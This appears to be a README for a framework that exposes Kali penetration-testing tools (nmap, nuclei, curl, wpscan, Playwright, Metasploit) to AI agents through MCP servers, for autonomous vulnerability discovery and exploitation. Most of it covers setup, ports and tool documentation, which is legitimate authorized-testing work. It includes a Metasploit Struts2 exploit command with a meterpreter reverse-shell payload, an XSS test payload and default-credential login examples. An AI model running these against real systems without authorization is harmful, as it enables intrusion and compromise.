# RedAmon MCP Servers

MCP (Model Context Protocol) servers for agentic penetration testing. These servers expose security tools to AI agents via the MCP protocol, enabling autonomous vulnerability discovery and exploitation.

## Architecture

### Folder Structure

```
mcp/
├── docker-compose.yml      # Container orchestration
├── requirements.txt        # Python dependencies
├── kali-sandbox/
│   └── Dockerfile         # Kali Linux with all tools
├── servers/
│   ├── __init__.py
│   ├── run_servers.py     # Server launcher
│   ├── network_recon_server.py  # HTTP client + port scanning (dynamic)
│   ├── nuclei_server.py         # Vuln scanning (dynamic)
│   ├── nmap_server.py           # Network mapper (dynamic)
│   ├── metasploit_server.py     # Exploitation (structured)
│   └── playwright_server.py     # Browser automation (dual-mode)
├── output/                # Scan results
└── nuclei-templates/      # Custom nuclei templates (optional)
```

### How It Works

```
HOST (your machine)                              DOCKER CONTAINER (Kali Linux)
───────────────────                              ─────────────────────────────

mcp/servers/                      ──VOLUME──>    /opt/mcp_servers/
├── network_recon_server.py       (hot reload)   ├── network_recon_server.py
├── nuclei_server.py                             ├── nuclei_server.py
├── nmap_server.py                               ├── nmap_server.py
├── metasploit_server.py                         ├── metasploit_server.py
└── run_servers.py                               └── run_servers.py
                                                          │
mcp/requirements.txt              ──COPY──>      /tmp/requirements.txt
                                  (build time)           │
                                                         ▼
                                                 pip install → /opt/venv/
                                                         │
                                                         ▼
                                                 python3 run_servers.py
                                                         │
                                         ┌───────────────┼───────────────┐
                                         │               │               │
                                         ▼               ▼               ▼
                                    Process 1       Process 2       Process 3  Process 4
                                         │               │               │         │
                                         ▼               ▼               ▼         ▼         ▼
                                    :8000           :8002           :8003      :8004      :8005
                                  network_recon     nuclei       metasploit    nmap    playwright
                                  (curl + naabu)                               │      (chromium)
                                         │               │           │         ▼
                                         ▼               ▼           ▼     /usr/bin/
                                    /usr/bin/      /root/go/bin/  msfconsole   nmap
                                  curl + naabu      nuclei
```

### Environment Variables

These variables are set in `docker-compose.yml` and passed to the container:

| Variable | Value | Description |
|----------|-------|-------------|
| `MCP_TRANSPORT` | `sse` | Transport mode: `stdio` (direct) or `sse` (network) |
| `MCP_HOST` | `0.0.0.0` | Host to bind servers (`0.0.0.0` = all interfaces) |
| `NETWORK_RECON_PORT` | `8000` | HTTP client + port scanner server |
| `NUCLEI_PORT` | `8002` | Vulnerability scanner server |
| `METASPLOIT_PORT` | `8003` | Exploitation framework server |
| `NMAP_PORT` | `8004` | Network mapper server |
| `PLAYWRIGHT_PORT` | `8005` | Browser automation server |
| `MSF_PROGRESS_PORT` | `8013` | Metasploit progress streaming endpoint |
| `MSF_RUN_TIMEOUT` | `1800` | Total timeout for `run` commands (30 min) |
| `MSF_RUN_QUIET_PERIOD` | `120` | Quiet period for `run` commands (2 min) |
| `MSF_EXPLOIT_TIMEOUT` | `600` | Total timeout for `exploit` commands (10 min) |
| `MSF_EXPLOIT_QUIET_PERIOD` | `120` | Quiet period for `exploit` commands (2 min) |
| `MSF_DEFAULT_TIMEOUT` | `120` | Default timeout for other commands (2 min) |
| `MSF_DEFAULT_QUIET_PERIOD` | `3` | Default quiet period (3 sec) |

### Data Flow

```
AI Agent (Claude/LangGraph)
         │
         │ MCP Protocol (JSON-RPC over SSE)
         ▼
┌──────────────────────────────────────────────────────────────────────────────┐
│                              KALI CONTAINER                                   │
│                                                                               │
│  ┌──────────────┐ ┌────────────┐ ┌──────────┐ ┌──────────────┐ ┌────────────┐ │
│  │network_recon │ │nuclei_server│ │nmap_server│ │  msf_server  │ │ playwright │ │
│  │   :8000      │ │    :8002   │ │   :8004  │ │ :8003 (MCP)  │ │   :8005    │ │
│  │(curl + naabu)│ └──────┬─────┘ └────┬─────┘ │ :8013 (prog.)│ │ (chromium) │ │
│  └──────┬───────┘        │            │       └──────┬───────┘ └─────┬──────┘ │
│           │                    │                │                │            │
│           ▼                    ▼                ▼                ▼            │
│    subprocess.run()    subprocess.run()   subprocess.run()  PersistentMsf    │
│     (curl / naabu)                                         (singleton)       │
│           │                    │                │                │            │
│           ▼                    ▼                ▼                ▼            │
│      /usr/bin/           /root/go/bin/     /usr/bin/        msfconsole       │
│    curl + naabu            nuclei            nmap                            │
│           │                    │                │                │            │
└───────────┼────────────────────┼────────────────┼────────────────┼────────────┘
            │                    │                │                │
            ▼                    ▼                ▼                ▼
      ┌─────────────────────────────────────────────────────────────┐
      │                    TARGET NETWORK                            │
      │                     10.0.0.0/24                              │
      └─────────────────────────────────────────────────────────────┘
```

### Tool Design Philosophy

| Server | Approach | Tools | Rationale |
|--------|----------|-------|-----------|
| network_recon | Dynamic CLI | `execute_curl(args)`, `execute_naabu(args)` | Simple CLIs, LLM knows flags |
| nuclei | Dynamic CLI | `execute_nuclei(args)` | Many templates/options, custom templates auto-discovered at startup |
| nmap | Dynamic CLI | `execute_nmap(args)` | Countless flags, LLM expertise |
| metasploit | Structured | `metasploit_console(command)`, `msf_restart()` | Stateful, sessions, complex workflows |
| playwright | Dual-mode | `execute_playwright(url/script)` | Content extraction or custom browser scripting |

**Dynamic CLI**: Pass raw command-line arguments. Maximum flexibility, trusts LLM knowledge.

**Structured Tools**: Explicit parameters for each function. Better for stateful operations.

## Quick Start

### 1. Build and Start Container

```bash
cd mcp
docker-compose up -d --build
```
#### only start after build
```bash
docker-compose up -d
```

### 2. Verify Services

```bash
# Check container status
docker-compose ps

# View logs
docker-compose logs -f kali-sandbox

# Test a server
curl http://localhost:8000/health

# Test commmands run for each server:
python mcp/test_mcp.py https://testphp.vulnweb.com
```

### 3. Connect AI Agent

The MCP servers are available at:
- **network_recon**: `http://localhost:8000` (HTTP requests + port scanning)
- **nuclei**: `http://localhost:8002` (vulnerability scanning)
- **metasploit**: `http://localhost:8003` (exploitation)
- **nmap**: `http://localhost:8004` (service detection, OS fingerprinting, NSE scripts)
- **playwright**: `http://localhost:8005` (browser automation, JS-rendered content)
- **metasploit progress**: `http://localhost:8013/progress` (live progress for long-running commands)

## Available Tools

### Network Recon Server (Port 8000)

Combined HTTP client and port scanner in a single server.

| Tool | Description |
|------|-------------|
| `execute_curl(args)` | Run curl with any CLI arguments (60s timeout) |
| `execute_naabu(args)` | Run naabu with any CLI arguments (300s timeout) |
| `execute_wpscan(args)` | Run WPScan WordPress vulnerability scanner with any CLI arguments (600s timeout) |

**Curl Examples:**
```python
execute_curl("-s -i http://10.0.0.5/")
execute_curl("-s -X POST -d 'user=admin' http://10.0.0.5/login")
execute_curl("-s -k https://10.0.0.5/")
execute_curl("-s -i -u admin:password http://10.0.0.5/admin")
```

**Naabu Examples:**
```python
execute_naabu("-host 10.0.0.5 -p 1-1000 -json")
execute_naabu("-host 10.0.0.5 -top-ports 100 -nmap-cli 'nmap -sV'")
execute_naabu("-host 10.0.0.5 -p 21,22,80,443,3306,8080 -json")
```

**WPScan Examples:**
```python
execute_wpscan("--url http://10.0.0.5 --format json --no-banner")
execute_wpscan("--url http://10.0.0.5 --enumerate p,t --format json --no-banner")
execute_wpscan("--url http://10.0.0.5 --enumerate vp,vt --format json --no-banner")
execute_wpscan("--url http://10.0.0.5 --api-token YOUR_TOKEN --format json --no-banner")
```

### Nuclei Server (Port 8002)

| Tool | Description |
|------|-------------|
| `execute_nuclei(args)` | Run nuclei with any CLI arguments (600s timeout). Custom templates at `/opt/nuclei-templates/` are auto-discovered and listed in the tool description at startup. |

**Examples:**
```python
execute_nuclei("-u http://10.0.0.5 -severity critical,high -jsonl")
execute_nuclei("-u http://10.0.0.5 -id CVE-2021-41773 -jsonl")
execute_nuclei("-u http://10.0.0.5 -tags xss,sqli -jsonl")

# Custom templates (paths listed in tool description)
execute_nuclei("-u http://10.0.0.5 -t /opt/nuclei-templates/http/misconfiguration/springboot/ -jsonl")
```

**Custom Templates:**

The `mcp/nuclei-templates/` directory is mounted read-only at `/opt/nuclei-templates/` inside the kali-sandbox container. At startup, the nuclei server scans this directory and dynamically appends all available template paths (with id, severity, name) to the `execute_nuclei` tool description, so the agent automatically knows what custom templates are available.

Templates can be uploaded, viewed, and deleted from the webapp UI (Project Settings → Nuclei → Template Options) via the `/api/nuclei-templates` REST API. Uploaded templates are global (shared across all projects) and immediately visible to the agent after a kali-sandbox restart.

### Nmap Server (Port 8004)

| Tool | Description |
|------|-------------|
| `execute_nmap(args)` | Run nmap with any CLI arguments (600s timeout) |

**Examples:**
```python
execute_nmap("-sV 10.0.0.5 -p 80,443")
execute_nmap("-A 10.0.0.5 -p 22,80")
execute_nmap("-sV --script vuln 10.0.0.5")
execute_nmap("-O 10.0.0.5")
execute_nmap("--script http-enum 10.0.0.5 -p 80")
execute_nmap("-sU 10.0.0.5 --top-ports 20")
```

### Playwright Server (Port 8005)

Browser automation with headless Chromium. Two operational modes for interacting with JavaScript-rendered pages.

| Tool | Description |
|------|-------------|
| `execute_playwright(url, selector, format)` | **Content mode** -- navigate to URL, extract rendered text or HTML (45s timeout) |
| `execute_playwright(script)` | **Script mode** -- run multi-step Playwright Python code with pre-initialized `browser`, `context`, `page` (60s timeout) |

**Content Mode Examples:**
```python
# Get all visible text from a page
execute_playwright(url="http://10.0.0.5:3000")

# Get HTML of a login form
execute_playwright(url="http://10.0.0.5/login", selector="form", format="html")

# Extract specific element text
execute_playwright(url="http://10.0.0.5/dashboard", selector=".user-info", format="text")
```

**Script Mode Examples:**
```python
# Login and capture authenticated page
execute_playwright(script="""
page.goto('http://10.0.0.5/login')
page.fill('#username', 'admin')
page.fill('#password', 'pass')
page.click('button[type=submit]')
page.wait_for_load_state('networkidle')
print(page.inner_text('body')[:3000])
""")

# Test XSS in search field
execute_playwright(script="""
page.goto('http://10.0.0.5/search')
page.fill('input[name=q]', '<script>alert(1)</script>')
page.click('button[type=submit]')
page.wait_for_load_state('networkidle')
print(page.content()[:5000])
""")
```

**Key details:**
- Runs headless Chromium with Chrome 120 user-agent
- Pre-initialized `browser`, `context`, `page` in script mode -- use `print()` for output
- Output capped at 15,000 characters (truncated with notice)
- Marked as a **dangerous tool** -- requires manual confirmation before execution
- Stealth mode: single-URL only, no crawling/bulk scraping, max 2 form submissions per target

### Metasploit Server (Port 8003)

| Tool | Description |
|------|-------------|
| `metasploit_console(command)` | Execute any msfconsole command (stateful) |
| `msf_restart()` | Restart msfconsole for a clean state (internal) |

The `metasploit_console` tool maintains a **single persistent msfconsole process** — module configurations, sessions, and variables persist across calls. Context-aware timeouts automatically adjust based on command type (`run`, `exploit`, or other).

#### Automatic Session Reset

When a new chat session starts, the agentic orchestrator automatically calls `msf_restart()` on the first `metasploit_console` use. This ensures:
- All previous sessions are cleared
- Module configurations are reset
- A fresh msfconsole instance is started

This happens transparently - the LLM agent doesn't need to call `msf_restart()` directly.

**Examples:**
```python
metasploit_console("search CVE-2017-5638")
metasploit_console("use exploit/multi/http/struts2_content_type_ognl")
metasploit_console("set RHOSTS 10.0.0.5; set RPORT 8080; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.10; set LPORT 4444; exploit")
metasploit_console("sessions -l")
metasploit_console("sessions -i 1")
```

## Progress Streaming for Long-Running Commands

Long-running operations (like Hydra brute force attacks or Metasploit exploits) can take several minutes. To provide real-time feedback, the MCP container exposes a separate HTTP progress endpoint.

### Architecture

```
┌─────────────────┐     ┌──────────────────┐     ┌─────────────────────────────┐
│   Frontend      │◄────│   Agentic        │     │   MCP Container             │
│   (WebSocket)   │     │   (orchestrator) │     │                             │
└─────────────────┘     └──────────────────┘     │  ┌─────────────────────┐    │
        │                       │                │  │ FastMCP (port 8003) │    │
        │ TOOL_OUTPUT_CHUNK     │ MCP tool call  │  │ metasploit_console  │    │
        │◄──────────────────────│───────────────►│  └─────────────────────┘    │
        │                       │                │            ▲                 │
        │                       │ HTTP GET       │            │ shared          │
        │                       │ /progress      │            │ singleton       │
        │                       │───────────────►│  ┌────────┴────────────┐    │
        │                       │◄───────────────│  │ Progress HTTP       │    │
        │                       │ JSON response  │  │ (port 8013)         │    │
        │                       │                │  └─────────────────────┘    │
        │                       │                └─────────────────────────────┘
```

### How It Works

1. **MCP Limitation**: MCP tools cannot stream responses—they must return complete results
2. **Parallel HTTP Endpoint**: A lightweight HTTP server runs on port 8013 alongside FastMCP
3. **Shared State**: Both servers access the same `PersistentMsfConsole` singleton
4. **Polling**: The agentic orchestrator polls `/progress` every 5 seconds during execution
5. **WebSocket Forwarding**: Progress updates are forwarded to the frontend via `TOOL_OUTPUT_CHUNK` messages

### Progress Endpoint

**URL:** `http://localhost:8013/progress`

**Response:**
```json
{
  "active": true,
  "command": "run",
  "elapsed_seconds": 45.3,
  "line_count": 127,
  "output": "[*] 10.0.0.5:22 - Attempting login...\n[*] 10.0.0.5:22 - Trying username: admin..."
}
```

| Field | Type | Description |
|-------|------|-------------|
| `active` | boolean | Whether a command is currently executing |
| `command` | string | First 100 chars of the current command |
| `elapsed_seconds` | float | Seconds since command started |
| `line_count` | int | Total lines of output so far |
| `output` | string | Last 100 lines of output |

### Testing Progress Endpoint

```bash
# Start a long-running command via MCP, then in another terminal:
curl http://localhost:8013/progress | jq .

# Watch progress live:
watch -n 2 'curl -s http://localhost:8013/progress | jq .'
```

### Timing Configuration

Metasploit uses quiet-period detection to determine when a command finishes. When no output is received for `quiet_period` seconds, the command is considered complete.

| Command Type | Timeout | Quiet Period | Use Case |
|--------------|---------|--------------|----------|
| `run` | 30 min | 2 min | Metasploit `run` commands |
| `exploit` | 10 min | 2 min | CVE exploits (staged payloads) |
| Other | 3 min | 5 sec | Search, info, sessions, etc. |

These values can be tuned via environment variables (see Environment Variables section).

## Running Locally (Development)

### stdio Mode (Single Server)

```bash
cd mcp/servers
python run_servers.py --server network_recon --stdio
```

### SSE Mode (All Servers)

```bash
cd mcp/servers
pip install -r ../requirements.txt
python run_servers.py
```

## Configuration

All configuration is hardcoded in `docker-compose.yml`:

```yaml
environment:
  - MCP_TRANSPORT=sse
  - MCP_HOST=0.0.0.0
  - NETWORK_RECON_PORT=8000
  - NUCLEI_PORT=8002
  - METASPLOIT_PORT=8003
  - NMAP_PORT=8004
  - PLAYWRIGHT_PORT=8005
  - MSF_PROGRESS_PORT=8013

ports:
  - "8000:8000"   # network_recon (curl + naabu)
  - "8002:8002"   # nuclei
  - "8003:8003"   # metasploit
  - "8004:8004"   # nmap
  - "8005:8005"   # playwright (browser automation)
  - "8013:8013"   # metasploit progress endpoint
```

To change ports or settings, edit `docker-compose.yml` directly.

**Note:** If you change port mappings, you must recreate the container (not just restart):
```bash
docker-compose down && docker-compose up -d
```

## Security Notice

These tools are designed for **authorized penetration testing only**. Only use against systems you have explicit permission to test. The containers run with elevated privileges (`NET_ADMIN`, `NET_RAW`) required for network scanning.

## Troubleshooting

### Metasploit Slow to Start

First run initializes the database. Subsequent starts are faster.

```bash
# Check Metasploit status
docker-compose exec kali-sandbox msfdb status
```

### Nuclei Templates Missing

Templates are auto-downloaded on first run. Force update:

```bash
docker-compose exec kali-sandbox nuclei -update-templates
```

### Permission Denied for Scanning

Ensure container has required capabilities:

```bash
docker-compose exec kali-sandbox capsh --print
```

### Progress Endpoint Not Working

If `curl http://localhost:8013/progress` returns "Connection refused":

1. **Check port mapping**: Port changes require container recreation, not just restart:
   ```bash
   docker-compose down && docker-compose up -d
   ```

2. **Verify progress server is running**:
   ```bash
   docker-compose logs kali-sandbox | grep "Progress server"
   ```
   You should see: `Started metasploit progress server on port 8013`

3. **Check if port is listening inside container**:
   ```bash
   docker-compose exec kali-sandbox netstat -tlnp | grep 8013
   ```

### Credential Testing Command Not Completing

**Note:** Brute force now uses THC Hydra (`execute_hydra`) which is stateless and has a 30-minute hard timeout. The troubleshooting below applies to legacy Metasploit brute force. If Hydra times out, reduce wordlist size or thread count.

If legacy Metasploit SSH brute force runs forever without returning:

1. Check if output contains only prompt/cursor noise (filtered as non-meaningful)
2. Verify `MSF_RUN_QUIET_PERIOD` is appropriate for your wordlist size
3. Check progress endpoint to see if output is still being generated:
   ```bash
   watch -n 5 'curl -s http://localhost:8013/progress | jq .line_count'
   ```
